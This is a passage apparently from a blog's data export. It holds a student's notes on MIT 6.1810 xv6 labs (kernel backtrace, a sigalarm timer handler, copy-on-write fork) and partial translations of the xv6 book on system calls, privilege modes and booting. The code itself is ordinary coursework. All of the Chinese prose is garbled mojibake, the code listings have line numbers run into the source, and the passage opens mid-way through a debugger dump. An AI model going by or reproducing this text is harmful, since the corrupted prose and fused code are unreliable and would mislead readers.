0x00000000800090300x3fffff9fd0: 0x0000003fffffa000 0x0000000080001d120x3fffff9fe0: 0x0000000000000063 0x0000000000014f500x3fffff9ff0: 0x0000000000003fd0 0x00000000000000120x3fffffa000: Cannot access memory at address 0x3fffffa000 ä½†æ˜¯åœ¨ç”¨æˆ·æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆæ˜¯é¡µé¢çš„é¦–åœ°å€ - 0x10ï¼Œå°±å¾ˆæ€ªã€‚ã€‚ã€‚ æ¯”å¦‚åœ¨ sh æ‰“å° $ æ—¶ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ ˆï¼Œ0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0ï¼Œæœ€åä¸€ä¸ªæŒ‡é’ˆæ˜¯ 0x4ff0 12345678910(gdb) x/20gx $fp-0x100x4f80: 0x0000000000004fd0 0x0000000000000ade0x4f90: 0x0000000000000000 0x05050505050505050x4fa0: 0x0505050505050505 0x05050505050505050x4fb0: 0x00000000000008a8 0x00000000000000000x4fc0: 0x0000000000004fe0 0x0000000000000b660x4fd0: 0x0000000000003fd0 0x00000000000000de0x4fe0: 0x0000000000004ff0 0x00000000000000000x4ff0: 0x0000000000006873 0x00000000000000000x5000: Cannot access memory at address 0x5000 ç®—äº†ï¼Œä¸ç®¡è¿™ä¹ˆå¤šäº†ï¼Œåæ­£ä¹Ÿåªç”¨å›æº¯å†…æ ¸æ ˆ æŠŠ backtrace è´´åˆ° kernel/printf.c ä¸­ï¼Œåœ¨ kernel/defs.h ä¸­æ·»åŠ å£°æ˜ï¼Œç„¶ååœ¨ sys_sleep è°ƒç”¨å°±å¥½äº† kernel/printf.c12345678voidbacktrace(void){ printf(&quot;backtrace:\\n&quot;); for(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp-0x10)){ printf(&quot;%p\\n&quot;, *(uint64*)(fp-0x8)); }} è·å¾—çš„åœ°å€å¯ä»¥é€šè¿‡ addr2line å¾—åˆ°å¯¹åº”çš„ç¨‹åºä»£ç çš„ä½ç½®ï¼Œä¾¿äºè°ƒè¯• å¦‚ addr2line -e kernel/kernel æ”¾åˆ° panic å‡½æ•°ä¸­ï¼Œå¯ä»¥æ›´å¥½åœ°æ–¹ä¾¿å†…æ ¸å´©æºƒåŸå›  Alarmæ·»åŠ ä¸€ä¸ªç”¨æˆ·çº§çš„å®šæ—¶å™¨ä¸­æ–­ï¼Œä¹Ÿå°±æ˜¯ sigalarm(interval, handler) å’Œ sigreturn() æ¯ n æ¬¡ç¡¬ä»¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ handlerï¼Œåœ¨ handler ä¸­è¦æœ‰ sigreturn ä¿è¯è¿˜åŸåˆ°åŸæœ¬çš„çŠ¶æ€ ç¬”è€…å¤©çœŸåœ°ä»¥ä¸ºä¿å­˜ p-&gt;trapframe-&gt;epc å°±è¡Œäº†ï¼Œwsfwï¼ˆè¿˜æœ‰é€šç”¨å¯„å­˜å™¨è¦è¿›è¡Œä¿å­˜ï¼‰ åœ¨ proc ç»“æ„ä½“æ·»åŠ å˜é‡kernel/proc.h123456789struct proc { ... int ticks; int alarm_interval; uint64 alarm_handler; struct trapframe *alarm_state;} ticks ä¿å­˜è®¡æ—¶å™¨ä¸­æ–­æ¬¡æ•°ï¼Œæ¯ä¸­æ–­ä¸€æ¬¡ï¼Œticks++ alarm_state ç›´æ¥ç”¨ struct trapframe ç»“æ„ä½“ä¿å­˜åŸçŠ¶æ€ï¼ˆç¬”è€…æ˜¯ä¸ªæ‡’äºº åœ¨æ¯æ¬¡è°ƒç”¨ handler å‰ï¼Œå°†å…¶æŒ‡å‘ p-&gt;trapframe + 1ï¼Œsigreturn åç½®é›¶ åˆå§‹åŒ–kernel/proc.c12345678910111213static struct proc*allocproc(void){ ... p-&gt;ticks = 0; p-&gt;alarm_interval = 0; p-&gt;alarm_handler = 0; p-&gt;alarm_state = 0; return p;} æ·»åŠ ç³»ç»Ÿè°ƒç”¨kernel/sysproc.h1234567891011121314151617181920212223242526uint64sys_sigalarm(void){ int ticks; uint64 handler; struct proc *p = myproc(); argint(0, &amp;ticks); argaddr(1, &amp;handler); p-&gt;alarm_interval = ticks; p-&gt;alarm_handler = handler; return 0;}uint64sys_sigreturn(void){ struct proc *p = myproc(); uint64 a0 = p-&gt;alarm_state-&gt;a0; memmove(p-&gt;trapframe, p-&gt;alarm_state, sizeof(struct trapframe)); memset(p-&gt;alarm_state, 0, sizeof(struct trapframe)); p-&gt;alarm_state = 0; return a0;} è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ handlerkernel/trap.c12345678910111213141516voidusertrap(void){ ... // give up the CPU if this is a timer interrupt. if(which_dev == 2) { yield(); p-&gt;ticks++; if(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == 0) { p-&gt;alarm_state = p-&gt;trapframe + 1; memmove(p-&gt;alarm_state, p-&gt;trapframe, sizeof(struct trapframe)); p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler; } }} æœ€åæ·»åŠ ä¸€äº›å£°æ˜å³å¯ Option challenge exercisesbacktrace æ‰“å°å‡½æ•°åå’Œè¡Œå·#todo","link":"/2022/10/31/Lab4_Traps/"},{"title":"Lab5 Copy-on-write fork","text":"é¡µè¡¨ç‰›é€¼ å®ç° Copy-on-write fork æ·»åŠ å®å®šä¹‰ PTE_COWï¼Œä½¿ç”¨ PTE çš„ RSW æœ€ä½æœ‰æ•ˆä½ï¼Œæ¥æ ‡è¯†æ˜¯å¦æ˜¯ COW é¡µï¼Œåªç”¨äºå¯å†™é¡µ kernel/riscv.h1#define PTE_COW (1L &lt;&lt; 8) æ·»åŠ  reference count æ ‡è¯†ä¸€ä¸ªç‰©ç†é¡µé¢è¢«å‡ ä¸ªç”¨æˆ·é¡µè¡¨æŒ‡å‘ï¼Œåˆå§‹åŒ–ï¼Œå¢å‡ æç¤ºä½¿ç”¨ kenel/kalloc.c é‡Œ kinit() é‡Œ freerange() çš„èŒƒå›´ï¼Œé€šè¿‡è°ƒè¯• end = 0x80041c50ï¼ŒPHYSTOP = 0x88000000ï¼Œç›¸å‡é™¤ä»¥ 4096 å¾— 0x7fbe ä½†æ˜¯åœ¨ make qemu æ—¶ï¼Œè¿‡ usertests -q æ—¶ï¼Œæœ€åä¼šæ˜¾ç¤ºä¸¢å¤±ä¸€äº›é¡µï¼Œä½†æ˜¯ make CPUS=1 qemu-gdb æ—¶åˆæ˜¾ç¤ºé€šè¿‡ï¼Œå¯èƒ½å­å•Šå¤šæ ¸æ—¶ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¾ˆæ€ª å°† 0x7fbe æ”¹ä¸º 0x7fc0 å°±æ²¡æœ‰é—®é¢˜ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œå¦‚æœæœ‰äº†è§£çš„å¸ˆå‚…å¯ä»¥å‘Šè¯‰æˆ‘ğŸ ç¬”è€…æŠŠå®ƒæ”¾åˆ° kmem é‡Œï¼Œå¢å‡æ—¶ç”¨ kmem.lock é” kernel/kalloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778struct { struct spinlock lock; struct run *freelist; uint refers[0x7fc0];} kmem;voidkinit(){ initlock(&amp;kmem.lock, &quot;kmem&quot;); acquire(&amp;kmem.lock); for(int i = 0; i &lt; sizeof(kmem.refers) / sizeof(kmem.refers[0]); ++i) { kmem.refers[i]++; } release(&amp;kmem.lock); freerange(end, (void*)PHYSTOP);}voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(&quot;kfree&quot;); krefDecre(pa); if(!kref(pa)) { // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(&amp;kmem.lock); r-&gt;next = kmem.freelist; kmem.freelist = r; release(&amp;kmem.lock); }}void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-&gt;next; release(&amp;kmem.lock); if(r) { krefIncre((void*)r); memset((char*)r, 5, PGSIZE); // fill with junk } return (void*)r;}uintkref(void *pa){ return kmem.refers[(pa - (void*)end)/4096];}voidkrefIncre(void *pa){ acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]++; release(&amp;kmem.lock);}voidkrefDecre(void *pa) { acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]--; release(&amp;kmem.lock);} ä¿®æ”¹ uvmcopyï¼Œåœ¨å¤åˆ¶æ—¶å°†å­è¿›ç¨‹é¡µè¡¨ç›´æ¥æŒ‡å‘çˆ¶è¿›ç¨‹é¡µè¡¨å¯¹åº”çš„ç‰©ç†åœ°å€ å› ä¸ºåœ¨è°ƒç”¨ fork æ—¶ï¼Œå¤åˆ¶å†…å­˜å°±æ˜¯ç›´æ¥è°ƒç”¨ uvmcopyï¼Œä¿®æ”¹è¿™ä¸ªå°±è¡Œ å½“é‡åˆ°å¯å†™çš„é¡µæ—¶ï¼Œå–æ¶ˆ PTE_Wï¼Œæ·»åŠ  PTE_COW kernel/vm.c123456789101112131415161718192021222324252627282930313233intuvmcopy(pagetable_t old, pagetable_t new, uint64 sz){ pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i &lt; sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(&quot;uvmcopy: pte should exist&quot;); if((*pte &amp; PTE_V) == 0) panic(&quot;uvmcopy: page not present&quot;); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); if(flags &amp; PTE_W) { flags = (flags &amp; ~PTE_W) | PTE_COW; } if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } if(flags &amp; PTE_COW) { *pte = PA2PTE(pa) | flags; } krefIncre((void*)pa); } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1;} æ€ä¹ˆæœ‰äººæ€»æ˜¯æŠŠ &amp; å’Œ | çš„åŠŸèƒ½å†™å ä¿®æ”¹ kernel/trap.c çš„ usertrap å’Œ kernel/vm.c çš„ copyoutï¼Œæ·»åŠ é‡åˆ° COW é¡µçš„æƒ…å†µ æ³¨æ„è™šæ‹Ÿåœ°å€è¦å°äº MAXVAï¼Œå¦åˆ™åœ¨ walk æ—¶ä¼šç›´æ¥å‡ºç° panic kernel/vm.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len){ uint64 n, va0, pa0; pte_t *pte = 0; while(len &gt; 0){ va0 = PGROUNDDOWN(dstva); if(dstva &lt; MAXVA) { pte = walk(pagetable, dstva, 0); } if(pte &amp;&amp; (*pte &amp; PTE_COW)) { if(copyCOW(pte)) { return -1; } } pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0;}intcopyCOW(pte_t *pte) { uint64 pa = PTE2PA(*pte); uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W; *pte = PA2PTE(pa) | flags; if(kref((void*)pa) != 1) { char *mem = kalloc(); if(mem == 0) { return -1; } else { memmove(mem, (char*)pa, PGSIZE); *pte = PA2PTE(mem) | flags; krefDecre((void*)pa); } } return 0;} kernel/trap.c12345if(r_scause() == 15 &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), 0)) &amp; PTE_COW)) { // store COW page fault if(copyCOW(pte)) { setkilled(p); } æœ€ååœ¨ kernel/defs.h é‡Œæ·»åŠ ä¸€äº›å‡½æ•°å£°æ˜å³å¯ Optional challenge exerciseæµ‹é‡ä½ çš„ COW å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…#todo","link":"/2022/11/12/Lab5_Copy_on_write_fork/"},{"title":"Xv6","text":"æœ¬æ–‡æ˜¯ç¬”è€…åœ¨å­¦ä¹  MIT 6.1810 2022 Fall é˜…è¯» xv6 æ–‡æ¡£æ—¶æ‰€å†™ï¼Œå¤§éƒ¨åˆ†æ˜¯å°†åŸæ–‡ç¿»è¯‘ï¼Œç¬”è€…å°½å¯èƒ½åŠ å…¥è‡ªå·±çš„ç†è§£å¹¶æ’ç‰ˆï¼Œåº”è¯¥ä¼šæŒç»­æ›´æ–°ç›´åˆ°æ–‡æ¡£è¯»å®Œ Chapter 1 Operating system interfacesxv6 å®ç°çš„ Unix kernel çš„æœåŠ¡å’Œç³»ç»Ÿè°ƒç”¨çš„å­é›† åœ¨ user ç›®å½•ä¸‹å¯æŸ¥çœ‹ç¨‹åºæºç  System call Description int fork() åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œè¿”å›å­è¿›ç¨‹çš„ PID int exit(int status) ç»“æŸå½“å‰è¿›ç¨‹ï¼Œstatus è¿”å›ç»™ wait() int wait(int *status) ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹ exitï¼Œexit çš„ status åœ¨ *statusä¸­ï¼Œè¿”å›å­è¿›ç¨‹ PIDï¼Œæ²¡æœ‰å­è¿›ç¨‹è¿”å› -1 int kill(int pid) ç»“æŸ PID å¯¹åº”çš„è¿›ç¨‹ï¼Œè¿”å› 0 æˆ– -1 int getpid() è¿”å›å½“å‰è¿›ç¨‹çš„ PID int sleep(int n) æš‚åœ n ä¸ªæ—¶é’Ÿ int exec(char *file, char *argv[]) åŠ è½½æ–‡ä»¶å¹¶ä½¿ç”¨å‚æ•°æ‰§è¡Œï¼Œä»…åœ¨é”™è¯¯æ—¶è¿”å› char *sbrk(int n) å†…å­˜å¢åŠ  n å­—èŠ‚ï¼Œè¿”å›æ–°å†…å­˜çš„é¦–åœ°å€ int open(char *file, int flags) æ‰“å¼€æ–‡ä»¶ï¼Œflags è¡¨ç¤ºè¯»å†™ï¼Œè¿”å›ä¸€ä¸ª fd int write(int fd, char *buf, int n) ä» buf å‘ fd å†™ n å­—èŠ‚ï¼Œè¿”å› n int read(int fd, char *buf, int n) ä» fd è¯» n å­—èŠ‚å‘ buf å†™å…¥ï¼Œè¿”å›è¯»çš„å­—èŠ‚æ•° int close(int fd) é‡Šæ”¾ fd int dup(int fd) è¿”å›ä¸ fd ç›¸åŒæ–‡ä»¶çš„ä¸€ä¸ªæ–°çš„ fd int pipe(int p[]) åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå°†è¯»å†™ fd æ”¾å…¥ p[0] å’Œ p[1] int chdir(char *dir) æ”¹å˜å½“å‰ç›®å½• int mkdir(char *dir) åˆ›å»ºä¸€ä¸ªç›®å½• int mknod(char *file, int, int) åˆ›å»ºä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ int fstat(int fd, struct stat *st) è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st int stat(char *file, struct stat *st) è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st int link(char *file1, char *file2) ä¸º file1 åˆ›å»ºå¦ä¸€ä¸ªåå­— file2ï¼Œå³ç¡¬é“¾æ¥ int unlink(char *file) åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ å¦‚æœæ²¡æœ‰å¦å¤–è¯´æ˜ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å› 0 ä¸ºæ­£å¸¸ï¼Œè¿”å› -1 ä¸ºé”™è¯¯ è¿›ç¨‹å’Œå†…å­˜çˆ¶å­è¿›ç¨‹çš„å†…å­˜å…³ç³» I/O å’Œæ–‡ä»¶æè¿°ç¬¦ç®¡é“p[0] ä¸ºè¯»ç«¯ï¼Œp[1] ä¸ºå†™ç«¯ å¦‚æœè¯»ç«¯æ²¡æœ‰æ•°æ®ï¼Œread ä¼šç­‰å¾…æ•°æ®å†™å…¥æˆ–ç­‰å¾…æŒ‡å‘å†™ç«¯çš„æ‰€æœ‰ fd å…³é—­ï¼Œåè€…ç±»ä¼¼åˆ°æ–‡ä»¶ç»“å°¾ï¼Œ read ä¼šè¿”å› 0 å¦‚æœ read åˆ°è¯»ç«¯ï¼Œä¼šä¸€ç›´ç­‰å¾… shell å¯ä»¥ç”¨ | ç¬¦å·å®ç°ç®¡é“ grep fork sh.c | wc -l å°† | å·¦è¾¹çš„ç»“æœé€šè¿‡ç®¡é“æµå‘å³è¾¹ å¤š | å¯ä»¥åˆ›å»ºè¿›ç¨‹æ ‘ ç®¡é“å¯ä»¥è‡ªå·±æ¸…ç†è‡ªå·± å¯ä»¥é€šè¿‡ä»»æ„é•¿åº¦çš„æ•°æ®æµ ç®¡é“å¯ä»¥å¹¶è¡Œæ‰§è¡Œ æ–‡ä»¶ç³»ç»Ÿ#todo çœŸå®ä¸–ç•ŒUnix ç³»ç»Ÿè°ƒç”¨æ¥å£é€šè¿‡ POSIX æ ‡å‡†è¿›è¡Œæ ‡å‡†åŒ– Chapter 2 Operating system organizationä¸‰ä¸ªè¦æ±‚ å¤šè·¯å¤ç”¨ éš”ç¦» äº¤äº’ æŠ½è±¡ç‰©ç†èµ„æºæ¯ä¸ªåº”ç”¨ç¨‹åºç›´æ¥è®¿é—®ç‰©ç†èµ„æº æ•ˆç‡é«˜ éœ€è¦åº”ç”¨ç¨‹åºä¹‹é—´å¯ä¿¡ä¸”æ²¡æœ‰é”™è¯¯ å› æ­¤éœ€è¦è¿›è¡Œå¼ºéš”ç¦»ï¼ŒåŒæ—¶ä¹Ÿä¼šæä¾›ä¾¿åˆ© ç¦æ­¢åº”ç”¨ç¨‹åºç›´æ¥è®¿é—®æ•æ„Ÿçš„ç¡¬ä»¶èµ„æºï¼Œå°†èµ„æºæŠ½è±¡ä¸ºæœåŠ¡ ç”¨æˆ·/ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨å¼ºéš”ç¦»éœ€è¦åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿä¹‹é—´æœ‰ç¡¬è¾¹ç•Œ CPU èƒ½æä¾›ç¡¬ä»¶æ”¯æŒ RISC-V çš„ CPU æœ‰ä¸‰ç§æ¨¡å¼ï¼šæœºå™¨æ¨¡å¼ã€ç®¡ç†è€…ï¼ˆsupervisorï¼‰æ¨¡å¼ã€ç”¨æˆ·æ¨¡å¼ æœºå™¨æ¨¡å¼ æ‰§è¡Œçš„æŒ‡ä»¤å…·æœ‰å®Œå…¨ç‰¹æƒ ä¸»è¦ç”¨å…·é…ç½®è®¡ç®—æœºï¼Œè¿è¡Œä¸€æ®µä»£ç åä¼šè¿›å…¥å†…æ ¸æ¨¡å¼ ç®¡ç†è€…æ¨¡å¼ CPU å¯æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ å¯ç”¨ã€ç¦ç”¨ç»ˆç«¯ è¯»å†™é¡µè¡¨å¯„å­˜å™¨ ç”¨æˆ·æ¨¡å¼ CPU ä¸èƒ½æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ å¦‚æœå°è¯•æ‰§è¡Œï¼ŒCPU ä¼šåˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ï¼Œå¹¶ä¸”æ€æ­»åº”ç”¨ç¨‹åº é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è°ƒç”¨å†…æ ¸å‡½æ•° ç³»ç»Ÿè°ƒç”¨ä¼šè·³è½¬åˆ°å†…æ ¸æŒ‡å®šçš„å…¥å£ç‚¹ CPU ä»ç”¨æˆ·æ¨¡å¼åˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ å†…æ ¸å¯ä»¥éªŒè¯ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ˜¯å¦åˆç†ï¼Œå†³å®šæ˜¯å¦è¿›è¡Œè¯·æ±‚çš„æ“ä½œ å†…æ ¸å’Œç®¡ç†è€…æ¨¡å¼ä¼¼ä¹æœ‰ç‚¹åˆ†ä¸æ¸…ï¼Ÿ ç¬”è€…çš„ç†è§£ï¼šç®¡ç†è€…æ¨¡å¼æ˜¯ RISC-V çš„ CPU å®šä¹‰çš„ï¼Œç›¸å¯¹äºç”¨æˆ·æ¨¡å¼å¤šäº†ä¸€äº›ç‰¹æƒï¼›å†…æ ¸æ˜¯ç›¸å¯¹ç”¨æˆ·ä»£ç è€Œè¨€ï¼Œè¿è¡Œåœ¨ä¸åŒçš„æ¨¡å¼ä¸‹ã€‚æ¨¡å¼å¯¹åº”ç€èº«ä»½ï¼Œå†…æ ¸å’Œç”¨æˆ·ä»£ç å¯¹åº”ç€ä¸€ä¸ªå®ä½“ å†…æ ¸æ¶æ„å®å†…æ ¸è®¾è®¡ç¼ºç‚¹ï¼šæ“ä½œç³»ç»Ÿä¸åŒéƒ¨åˆ†ä¹‹é—´çš„æ¥å£å¤æ‚ï¼Œç¼–å†™ä»£ç å®¹æ˜“å‡ºé”™ å¾®å†…æ ¸è®¾è®¡æœ€å¤§é™åº¦åœ°å‡å°‘å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œçš„æ“ä½œç³»ç»Ÿä»£ç æ•°é‡ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å¤§éƒ¨åˆ†åŠŸèƒ½ xv6 kernel ä»£ç æ¶æ„ æ–‡ä»¶ æè¿° æ–‡ä»¶ æè¿° bio.c æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜å—ç¼“å†² proc.c è¿›ç¨‹å’Œè°ƒåº¦ console.c è¿æ¥åˆ°ç”¨æˆ·é”®ç›˜å’Œå±å¹• sleeplock.c æ”¾å¼ƒ CPU çš„é” entry.S ç¬¬ä¸€æ¬¡å¯åŠ¨çš„æŒ‡ä»¤ spinlock.c ä¸æ”¾å¼ƒ CPU çš„é” exec.c exec() ç³»ç»Ÿè°ƒç”¨ start.c æœºå™¨æ¨¡å¼æ—©æœŸå¯åŠ¨ä»£ç  file.c æ–‡ä»¶æè¿°ç¬¦ string.c C å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„ä»£ç åº“ fs.c æ–‡ä»¶ç³»ç»Ÿ swtch.S çº¿ç¨‹åˆ‡æ¢ kalloc.c ç‰©ç†é¡µåˆ†é…å™¨ syscall.c ç³»ç»Ÿè°ƒç”¨çš„è°ƒåº¦ kernelvec.S å¤„ç†æ¥è‡ªå†…æ ¸çš„é™·é˜±ï¼Œå®šæ—¶å™¨ä¸­æ–­ sysfile.c æ–‡ä»¶ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ log.c æ–‡ä»¶ç³»ç»Ÿæ—¥å¿—è®°å½•å’Œå´©æºƒæ¢å¤ sysproc.c è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ main.c å¯åŠ¨é˜¶æ®µæ§åˆ¶å…¶ä»–æ¨¡å—çš„åˆå§‹åŒ– trampoline.S åˆ‡æ¢ç”¨æˆ·/å†…æ ¸æ¨¡å¼çš„æ±‡ç¼– pipe.c ç®¡é“ trap.c å¤„ç†é™·é˜±å’Œä¸­æ–­å¹¶ä»ä¸­è¿”å› plic.c RISC-V ä¸­æ–­æ§åˆ¶å™¨ uart.c ä¸²å£æ§åˆ¶å°è®¾å¤‡é©±åŠ¨ printf.c æ ¼å¼åŒ–è¾“å‡ºåˆ°æ§åˆ¶å° virtio_disk.c ç£ç›˜è®¾å¤‡é©±åŠ¨ vm.c ç®¡ç†é¡µè¡¨å’Œåœ°å€ç©ºé—´ defs.h æ¨¡å—é—´æ¥å£çš„å®šä¹‰ è¿›ç¨‹åœ°å€ç©ºé—´æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨ï¼Œå®šä¹‰äº†è¿›ç¨‹çš„åœ°å€ç©ºé—´ æœ‰è®¸å¤šå› ç´ é™åˆ¶äº†è¿›ç¨‹åœ°å€ç©ºé—´çš„æœ€å¤§å€¼ RISC-V çš„æŒ‡é’ˆä¸º 64 ä½ åœ¨é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€æ—¶ï¼Œç¡¬ä»¶ä»…ä½¿ç”¨ä½ 39 ä½ xv6 åªä½¿ç”¨ 38 ä½ #why å› æ­¤æœ€å¤§åœ°å€ä½ 2^38^ - 1 = 0x3fffffffffï¼Œå³ MAXVAï¼ˆåœ¨ kernel/risc.h ä¸­å®šä¹‰ï¼‰ã€ åœ¨åœ°å€ç©ºé—´çš„é¡¶éƒ¨ä¿ç•™äº†ä¸€é¡µç”¨ä½œ trampolineï¼ˆè·³æ¿ã€è¹¦åºŠï¼‰ï¼Œä¸€é¡µç”¨ä½œæ˜ å°„è¿›ç¨‹çš„ trapframeï¼ˆé™·é˜±å¸§ï¼‰ï¼Œxv6 ç”¨è¿™ä¸¤ä¸ªé¡µé¢è¿›å…¥å’Œé€€å‡ºå†…æ ¸ trampoline åŒ…å«è¿›å…¥å’Œé€€å‡ºå†…æ ¸çš„ä»£ç  trapframe æ˜ å°„ç”¨äºä¿å­˜å’Œæ¢å¤ç”¨æˆ·è¿›ç¨‹çš„çŠ¶æ€ è¿›ç¨‹çŠ¶æ€xv6 å†…æ ¸ç»´æŠ¤æ¯ä¸ªè¿›ç¨‹çš„çŠ¶æ€ï¼Œå­˜æ”¾åˆ° proc ç»“æ„ä½“ä¸­ï¼ˆkernel/proc.hï¼‰ æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯é¡µè¡¨ã€å†…æ ¸æ ˆã€è¿è¡ŒçŠ¶æ€ p-&gt;state è¡¨ç¤ºè¿›ç¨‹çŠ¶æ€ï¼ˆåˆ†é…ã€å‡†å¤‡è¿è¡Œã€ç­‰å¾…IOã€æ­£åœ¨é€€å‡ºï¼‰ p-&gt;pagetable ä¿å­˜é¡µè¡¨ï¼Œè¿˜ç”¨ä½œå­˜å‚¨è¿›ç¨‹å†…å­˜çš„ç‰©ç†é¡µåœ°å€çš„è®°å½• æ ˆç©ºé—´ æ¯ä¸ªè¿›ç¨‹æœ‰ä¸¤ä¸ªæ ˆï¼šç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆï¼ˆp-&gt;kstackï¼‰ åœ¨æ‰§è¡Œç”¨æˆ·æŒ‡ä»¤æ—¶ï¼Œåªæœ‰ç”¨æˆ·æ ˆåœ¨ä½¿ç”¨ï¼Œå†…æ ¸æ ˆä¸ºç©º å½“è¿›å…¥å†…æ ¸æ¨¡å¼ï¼ˆç³»ç»Ÿè°ƒç”¨æˆ–ä¸­æ–­ï¼‰ï¼Œå†…æ ¸ä»£ç ä¼šåœ¨å†…æ ¸æ ˆä¸Šæ‰§è¡Œï¼Œç”¨æˆ·æ ˆä¸å˜ å†…æ ¸æ ˆæ˜¯ç‹¬ç«‹çš„ï¼Œå³ä½¿è¿›ç¨‹ç ´åäº†ç”¨æˆ·æ ˆï¼Œå†…æ ¸ä¹Ÿå¯ä»¥æ‰§è¡Œ å¯åŠ¨ xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç  RISC-V å¼€æœºæ—¶ï¼Œä¼šè‡ªè¡Œåˆå§‹åŒ–ï¼Œè¿è¡Œå­˜å‚¨åœ¨ ROM ä¸­çš„å¼•å¯¼åŠ è½½ç¨‹åº å¼•å¯¼åŠ è½½ç¨‹åºå°† xv6 å†…æ ¸åŠ è½½åˆ°å†…å­˜ 0x80000000 ä¸­ï¼Œå› ä¸º 0 ~ 0x80000000 ä¹‹é—´åŒ…å« IO è®¾å¤‡ï¼ˆRISC-V åœ¨åˆ†é¡µç¡¬ä»¶ç¦ç”¨å’Œè™šæ‹Ÿåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†åœ°å€æ¡ä»¶ä¸‹å¼€å§‹ï¼‰ åœ¨æœºå™¨æ¨¡å¼ä¸‹ï¼Œä» _entry å¼€å§‹æ‰§è¡Œ xv6 _entry çš„æŒ‡ä»¤è®¾ç½®ä¸€ä¸ªæ ˆï¼Œä»¥ä¾¿ xv6 è¿è¡Œ C ä»£ç  xv6 åœ¨ kernel/start.c ä¸­å£°æ˜ä¸€ä¸ªåˆå§‹æ ˆ stack0 çš„ç©ºé—´ _entry çš„ä»£ç å°†æ ˆé¡¶å¯„å­˜å™¨ sp åŠ è½½åˆ° stack0 çš„é¡¶éƒ¨ stack0+0x1000 æ¥ä¸‹æ¥è°ƒç”¨ kernel/start.c ä¸­çš„ä»£ç  start å‡½æ•° å…ˆåœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œé…ç½®ä»£ç  å°† main çš„åœ°å€å†™å…¥ mepc å¯„å­˜å™¨ä½œä¸º mret è¿”å›åœ°å€ å°†æ‰€æœ‰ä¸­æ–­å’Œå¼‚å¸¸å§”æ‰˜ç»™å†…æ ¸æ¨¡å¼ å°† 0 å†™å…¥ satp é¡µè¡¨å¯„å­˜å™¨ï¼Œç¦ç”¨å†…æ ¸æ¨¡å¼ä¸‹çš„è™šæ‹Ÿå†…å­˜è½¬æ¢ å¯¹æ—¶é’ŸèŠ¯ç‰‡ç¼–ç¨‹æ¥ç”Ÿæˆè®¡æ—¶å™¨ä¸­æ–­ ç„¶åé€šè¿‡ mret æŒ‡ä»¤åˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼ï¼Œè¿›å…¥ main 